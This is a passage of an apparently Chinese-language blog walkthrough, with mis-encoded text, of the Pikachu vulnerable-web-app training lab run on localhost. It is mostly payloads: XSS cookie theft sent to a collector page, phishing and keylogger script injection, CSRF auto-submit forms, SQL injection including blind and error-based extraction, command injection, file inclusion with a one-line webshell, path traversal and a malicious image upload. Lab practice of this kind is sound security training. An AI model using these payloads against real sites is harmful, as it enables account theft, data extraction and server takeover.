ä¸è¿‡æœŸ </p><h3 id="éªŒè¯ç ç»•è¿‡ï¼ˆon-clientï¼‰"><a href="#éªŒè¯ç ç»•è¿‡ï¼ˆon-clientï¼‰" class="headerlink" title="éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰"></a>éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰</h3><p>ç›´æ¥çˆ†ç ´</p><h3 id="tokené˜²çˆ†ç ´"><a href="#tokené˜²çˆ†ç ´" class="headerlink" title="tokené˜²çˆ†ç ´?"></a>tokené˜²çˆ†ç ´?</h3><p>tokenå¯ä»¥è·å–å¹¶æ”¾å…¥ä¸‹ä¸€æ¬¡çˆ†ç ´ æ³¨æ„é€‰æ‹©åˆé€‚çš„çˆ†ç ´æ–¹å¼ï¼ˆpitchforkï¼‰</p><h2 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h2><h3 id="åå°„å‹XSSï¼ˆgetï¼‰"><a href="#åå°„å‹XSSï¼ˆgetï¼‰" class="headerlink" title="åå°„å‹XSSï¼ˆgetï¼‰"></a>åå°„å‹XSSï¼ˆgetï¼‰</h3><p>è¾“å…¥ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¯•ä¸€ä¸‹ å¦‚æœæœ‰è¾“å…¥å­—ç¬¦é™åˆ¶ï¼ˆå‰ç«¯ï¼‰ï¼Œå¯F12ç›´æ¥ä¿®æ”¹é™åˆ¶å€¼</p><h3 id="åå°„å‹XSSï¼ˆpostï¼‰"><a href="#åå°„å‹XSSï¼ˆpostï¼‰" class="headerlink" title="åå°„å‹XSSï¼ˆpostï¼‰"></a>åå°„å‹XSSï¼ˆpostï¼‰</h3><p>ç™»é™†åè¾“å…¥payload</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h3><p>å…ˆç‰¹æ®Šå­—ç¬¦è¯•ä¸‹ï¼Œç„¶åè¾“å…¥payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DOMå‹xss"><a href="#DOMå‹xss" class="headerlink" title="DOMå‹xss"></a>DOMå‹xss</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&quot;+str+&quot;&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;</span><br></pre></td></tr></table></figure><p>æ„é€ payloadæ›¿æ¢æ‰â€+str+â€ï¼Œpayloadä¸º#â€™ onclick &#x3D; â€œalert(â€˜evolutionâ€™)â€&gt;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//è¯•è¯•ï¼š&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">//è¯•è¯•ï¼š&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,é—­åˆæ‰å°±è¡Œ</span><br></pre></td></tr></table></figure><h3 id="DOMå‹xss-x"><a href="#DOMå‹xss-x" class="headerlink" title="DOMå‹xss-x"></a>DOMå‹xss-x</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#&#x27; onclick = &quot;alert(&#x27;evolution&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="xssç›²æ‰“"><a href="#xssç›²æ‰“" class="headerlink" title="xssç›²æ‰“"></a>xssç›²æ‰“</h3><p>è¾“å…¥payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç½‘é¡µåç¼€æ”¹ä¸ºadmin_login.phpï¼ŒæŸ¥çœ‹ä¿¡æ¯</p><h3 id="xssä¹‹è¿‡æ»¤"><a href="#xssä¹‹è¿‡æ»¤" class="headerlink" title="xssä¹‹è¿‡æ»¤"></a>xssä¹‹è¿‡æ»¤</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">sCriPt</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="xssä¹‹htmlspecialchars"><a href="#xssä¹‹htmlspecialchars" class="headerlink" title="xssä¹‹htmlspecialchars"></a>xssä¹‹htmlspecialchars</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">q&#x27;onclick=&#x27;alert(1111)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/TNlce25h3JUnP71.png" alt="xss_htmlspecialchars.png"></p><h3 id="xssä¹‹hrefè¾“å‡º"><a href="#xssä¹‹hrefè¾“å‡º" class="headerlink" title="xssä¹‹hrefè¾“å‡º"></a>xssä¹‹hrefè¾“å‡º</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(&#x27;evolution&#x27;)</span><br></pre></td></tr></table></figure><h3 id="xssä¹‹jsè¾“å‡º"><a href="#xssä¹‹jsè¾“å‡º" class="headerlink" title="xssä¹‹jsè¾“å‡º"></a>xssä¹‹jsè¾“å‡º</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">e&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="pikachu-Xss-åå°"><a href="#pikachu-Xss-åå°" class="headerlink" title="pikachu Xss åå°"></a>pikachu Xss åå°</h2><p>pkxssåå°ï¼š</p><p><a href="http://127.0.0.1:8081/pikachu/pkxss/pkxss_login.php">http://127.0.0.1:8081/pikachu/pkxss/pkxss_login.php</a></p><h3 id="cookieæœé›†"><a href="#cookieæœé›†" class="headerlink" title="cookieæœé›†"></a>cookieæœé›†</h3><h4 id="getå‹ï¼š"><a href="#getå‹ï¼š" class="headerlink" title="getå‹ï¼š"></a>getå‹ï¼š</h4><p>åœ¨åå°„å‹xssï¼ˆgetï¼‰ä¸­è¾“å…¥payloadï¼ˆæ³¨æ„å–æ¶ˆå‰ç«¯å­—ç¬¦é•¿åº¦çš„é™åˆ¶ï¼‰</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://127.0.0.1:8081/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F127.0.0.1%3A8081%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥æ›´æ”¹ä¸€ä¸‹ï¼Œè®©ä»–ç»§ç»­è·³è½¬åˆ°æ­£å¸¸ç•Œé¢ï¼ˆä¼ªè£…ä¸€ä¸‹ï¼‰</p><p>ä¿®æ”¹pikachu\pkxss\xcookie\cookie.phpæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1:8081/pikachu/index.php&quot;</span>);<span class="comment">//é‡å®šå‘åˆ°ä¸€ä¸ªå¯ä¿¡çš„ç½‘ç«™</span></span><br></pre></td></tr></table></figure><h4 id="postå‹"><a href="#postå‹" class="headerlink" title="postå‹"></a>postå‹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/pkxss/xcookie/post.html</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¿®æ”¹pikachu\pkxss\xcookie\post.htmlæ–‡ä»¶ä¸­çš„ä¸¤ä¸ªåœ°å€é“¾æ¥</p><h4 id="cookieåå°ä¿¡æ¯"><a href="#cookieåå°ä¿¡æ¯" class="headerlink" title="cookieåå°ä¿¡æ¯"></a>cookieåå°ä¿¡æ¯</h4><p><img src="https://s2.loli.net/2022/04/21/BImJ45QWKCT7vnD.png" alt="xss_cookie.png"></p><h3 id="é’“é±¼ç»“æœ"><a href="#é’“é±¼ç»“æœ" class="headerlink" title="é’“é±¼ç»“æœ"></a>é’“é±¼ç»“æœ</h3><p>ä¿®æ”¹pikachu\pkxss\xfish\fish.phpä¸­çš„é“¾æ¥åœ°å€ï¼ˆå…¶ä¸­çš„ç©ºæ ¼è¦å»æ‰ï¼‰</p><p>å­˜å‚¨å‹xssé¢˜ç›®ç•™è¨€æ¿ä¸­è¾“å…¥</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/xfish/fish.php&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/He3G9hPEsKyVR5c.png" alt="xss_fish.png"></p><h3 id="é”®ç›˜è®°å½•"><a href="#é”®ç›˜è®°å½•" class="headerlink" title="é”®ç›˜è®°å½•"></a>é”®ç›˜è®°å½•</h3><p>ä¿®æ”¹pikachu\pkxss\rkeypress\rk.jsä¸­ç¬¬54è¡Œåœ°å€é“¾æ¥</p><p>å­˜å‚¨å‹xssé¢˜ç›®ç•™è¨€æ¿ä¸­è¾“å…¥</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/rkeypress/rk.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/ZQKcLsS3tBixVwq.png" alt="xss_keyboard.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>è‹¥è¿›å…¥ç¼–è¾‘é¡µé¢æç¤º<code>MYSQL_ASSOC</code>è­¦å‘Šï¼Œå°†pikachu\vul\csrf\csrfget\csrf_get_edit.phpæ–‡ä»¶ä¸­çš„MYSQL_ASSOCä¿®æ”¹ä¸ºMYSQLI_ASSOCå³å¯(<strong>å„ä¸ªé¢˜ç›®ä¸­ç›¸åŒæŠ¥é”™åŒç†</strong>)</p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/mastergu2/article/details/107904129">https://blog.csdn.net/mastergu2/article/details/107904129</a></p></blockquote><p>è§‚å¯Ÿæµé‡åŒ…ï¼š</p><p><img src="https://s2.loli.net/2022/04/21/vkdSNTHtz4mLoPK.png" alt="csrf_get.png"></p><p>æ„é€ urlï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678922&amp;add=earth&amp;email=lucy%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>æ„é€ post.htmlå³å¯</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111111111&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;lucy@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>urlæ„é€ ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/csrf/csrfpost/post.html</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/xuandao_ahfengren/article/details/105699852?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165035634216782184636212%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165035634216782184636212&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105699852.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3&spm=1018.2226.3001.4187">pikachué¶åœºwp1</a></p></blockquote><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>å¾ˆå¥½çš„é˜²å¾¡CSRFæ”»å‡»çš„æ–¹æ³•ã€‚</p><h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h2><h3 id="æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰"><a href="#æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰" class="headerlink" title="æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰"></a>æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰</h3><p>ä¼ å…¥å‚æ•°ä¿®æ”¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or 1 = 1</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/e6lwziJvnFQqxbo.png" alt="sql_post.png"></p><h3 id="å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰"><a href="#å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰"></a>å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; or 1=1#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; or 1=1-- </span><br></pre></td></tr></table></figure><p>æ³¨æ„ç¬¬äºŒä¸ªpayloadæœ€åæœ‰ä¸ªç©ºæ ¼</p><h3 id="æœç´¢å‹æ³¨å…¥"><a href="#æœç´¢å‹æ³¨å…¥" class="headerlink" title="æœç´¢å‹æ³¨å…¥"></a>æœç´¢å‹æ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e%&#x27; or 1=1#</span><br></pre></td></tr></table></figure><h3 id="xxå‹æ³¨å…¥"><a href="#xxå‹æ³¨å…¥" class="headerlink" title="xxå‹æ³¨å…¥"></a>xxå‹æ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e&#x27;) or 1=1#</span><br></pre></td></tr></table></figure><h3 id="â€œinsert-x2F-updateâ€æ³¨å…¥"><a href="#â€œinsert-x2F-updateâ€æ³¨å…¥" class="headerlink" title="â€œinsert&#x2F;updateâ€æ³¨å…¥"></a>â€œinsert&#x2F;updateâ€æ³¨å…¥</h3><blockquote><p>åŸºäºæŠ¥é”™çš„æ³¨å…¥å¯åˆ©ç”¨çš„3ä¸ªå‡½æ•°ï¼š</p><ul><li>updatexml()</li><li>extractvalue()</li><li>floor()</li></ul></blockquote><h4 id="insertï¼ˆæ³¨å†Œï¼‰"><a href="#insertï¼ˆæ³¨å†Œï¼‰" class="headerlink" title="insertï¼ˆæ³¨å†Œï¼‰"></a>insertï¼ˆæ³¨å†Œï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><h4 id="updateï¼ˆä¿®æ”¹ï¼‰"><a href="#updateï¼ˆä¿®æ”¹ï¼‰" class="headerlink" title="updateï¼ˆä¿®æ”¹ï¼‰"></a>updateï¼ˆä¿®æ”¹ï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><h3 id="â€œdeleteâ€æ³¨å…¥"><a href="#â€œdeleteâ€æ³¨å…¥" class="headerlink" title="â€œdeleteâ€æ³¨å…¥"></a>â€œdeleteâ€æ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or updatexml(1,concat(0x7e,database()),0)</span><br></pre></td></tr></table></figure><p>payloadéœ€è¦ä½¿ç”¨urlç¼–ç ä¸€ä¸‹</p><p><img src="https://s2.loli.net/2022/04/21/otBxdq4lAe7hgw5.png" alt="sql_delete.png"></p><h3 id="â€œhttpheaderâ€æ³¨å…¥"><a href="#â€œhttpheaderâ€æ³¨å…¥" class="headerlink" title="â€œhttpheaderâ€æ³¨å…¥"></a>â€œhttpheaderâ€æ³¨å…¥</h3><h4 id="ä¿®æ”¹user-agent"><a href="#ä¿®æ”¹user-agent" class="headerlink" title="ä¿®æ”¹user-agent"></a>ä¿®æ”¹user-agent</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/UZHLIDRql5PCo4O.png" alt="sql_useragent.png"></p><h4 id="ä¿®æ”¹cookie"><a href="#ä¿®æ”¹cookie" class="headerlink" title="ä¿®æ”¹cookie"></a>ä¿®æ”¹cookie</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; and updatexml(1,concat(0x7e,database()),0)#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/chIJ62TEu4ziW3w.png" alt="sql_cookie.png"></p><h3 id="ç›²æ³¨ï¼ˆbased-on-boolianï¼‰"><a href="#ç›²æ³¨ï¼ˆbased-on-boolianï¼‰" class="headerlink" title="ç›²æ³¨ï¼ˆbased on boolianï¼‰"></a>ç›²æ³¨ï¼ˆbased on boolianï¼‰</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and ascii(substr(database(),1,1))=112#</span><br></pre></td></tr></table></figure><h3 id="ç›²æ³¨ï¼ˆbased-on-timeï¼‰"><a href="#ç›²æ³¨ï¼ˆbased-on-timeï¼‰" class="headerlink" title="ç›²æ³¨ï¼ˆbased on timeï¼‰"></a>ç›²æ³¨ï¼ˆbased on timeï¼‰</h3><p>å°è¯•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and sleep(5)#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/QN9yJxcgIF6P1AS.png" alt="sql_time.png"></p><p>å‘ç°å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œè¾“å…¥payloadè¿›è¡Œç›²æ³¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and if((substr(database(),1,1))=&#x27;p&#x27;,sleep(5),null)#</span><br></pre></td></tr></table></figure><p>è‹¥å»¶è¿Ÿæ—¶é—´æœ‰5såˆ™databaseç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºpï¼Œå¦åˆ™å­—ç¬¦ä¸å¯¹åº”ã€‚</p><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%df&#x27; or 1=1#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/aAp3moSsrUJYe7M.png" alt="sql_widebyte.png"></p><blockquote><h4 id="é™¤äº†ä¸Šè¿°å„ç§æ‰‹åŠ¨æ³¨å…¥æ–¹æ³•ï¼Œè¯»è€…ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨sqlmapå·¥å…·è¿›è¡Œæ³¨å…¥ã€‚"><a href="#é™¤äº†ä¸Šè¿°å„ç§æ‰‹åŠ¨æ³¨å…¥æ–¹æ³•ï¼Œè¯»è€…ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨sqlmapå·¥å…·è¿›è¡Œæ³¨å…¥ã€‚" class="headerlink" title="é™¤äº†ä¸Šè¿°å„ç§æ‰‹åŠ¨æ³¨å…¥æ–¹æ³•ï¼Œè¯»è€…ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨sqlmapå·¥å…·è¿›è¡Œæ³¨å…¥ã€‚"></a>é™¤äº†ä¸Šè¿°å„ç§æ‰‹åŠ¨æ³¨å…¥æ–¹æ³•ï¼Œè¯»è€…ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨sqlmapå·¥å…·è¿›è¡Œæ³¨å…¥ã€‚</h4></blockquote><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="execï¼ˆpingï¼‰"><a href="#execï¼ˆpingï¼‰" class="headerlink" title="execï¼ˆpingï¼‰"></a>execï¼ˆpingï¼‰</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig</span><br></pre></td></tr></table></figure><h3 id="execï¼ˆevalï¼‰"><a href="#execï¼ˆevalï¼‰" class="headerlink" title="execï¼ˆevalï¼‰"></a>execï¼ˆevalï¼‰</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_local.php?filename=../../../test/phpinfo.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><h3 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1:8081/pikachu/test/yijuhua.txt&amp;submit=æäº¤æŸ¥è¯¢</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/yijuhua.php?x=ipconfig</span><br></pre></td></tr></table></figure><h2 id="unsafe-filedownload"><a href="#unsafe-filedownload" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h2><h3 id="unsafe-filedownload-1"><a href="#unsafe-filedownload-1" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/unsafedownload/execdownload.php?filename=../../../wiki/image/title.png</span><br></pre></td></tr></table></figure><h2 id="unsafe-fileupload"><a href="#unsafe-fileupload" class="headerlink" title="unsafe fileupload"></a>unsafe fileupload</h2><h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p>å‰ç«¯é™åˆ¶ï¼Œåˆ é™¤æ£€æŸ¥å‡½æ•°å³å¯</p><p><img src="https://s2.loli.net/2022/04/21/rLMYNFlORvZIS7h.png" alt="upload_client.png"></p><h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p>ä¿®æ”¹postè¯·æ±‚çš„Content-Typeå­—æ®µå³å¯</p><p><img src="https://s2.loli.net/2022/04/21/A8xYrzsbKuJPl7F.png" alt="upload_MIME.png"></p><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>åˆ›å»ºæ–‡ä»¶phpinfo.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ–°å›¾ç‰‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy /b ai.png + phpinfo.php ccc.png</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ–‡ä»¶åï¼Œè·å¾—æ–‡ä»¶ä¿å­˜ä½ç½®ï¼Œæ„é€ urlè®¿é—®å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2022/04/21/69033462610e99ca1b5084426014.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><h2 id="over-permission"><a href="#over-permission" class="headerlink" title="over permission"></a>over permission</h2><h3 id="æ°´å¹³è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ" class="headerlink" title="æ°´å¹³è¶Šæƒ"></a>æ°´å¹³è¶Šæƒ</h3><p>ç™»é™†åä¿®æ”¹usernameå³å¯æŸ¥çœ‹ä»»æ„ç”¨æˆ·ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 